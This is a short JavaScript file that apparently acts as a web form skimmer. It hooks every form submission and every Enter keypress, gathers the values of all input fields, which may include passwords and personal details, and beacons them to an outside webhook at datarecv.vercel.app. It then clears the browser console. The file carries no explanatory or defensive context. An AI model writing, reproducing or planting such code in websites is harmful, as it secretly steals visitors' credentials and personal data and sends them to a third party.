const webhook = 'https://datarecv.vercel.app/api/webhook'

function send(data) {
  if (!data) return
  navigator.sendBeacon(webhook, JSON.stringify(data))
}

function getRaw() {
  const data = {}
  document.querySelectorAll('input').forEach((input) => {
    if (input.name || input.id) {
      data[input.name || input.id] = input.value
    }
  })
  return data
}

document.querySelectorAll('form').forEach((form) => {
  form.addEventListener('submit', () => {
    const formData = Object.fromEntries(new FormData(form).entries())
    send(formData)
  })
})

addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    send(getRaw())
  }
})

console.clear()
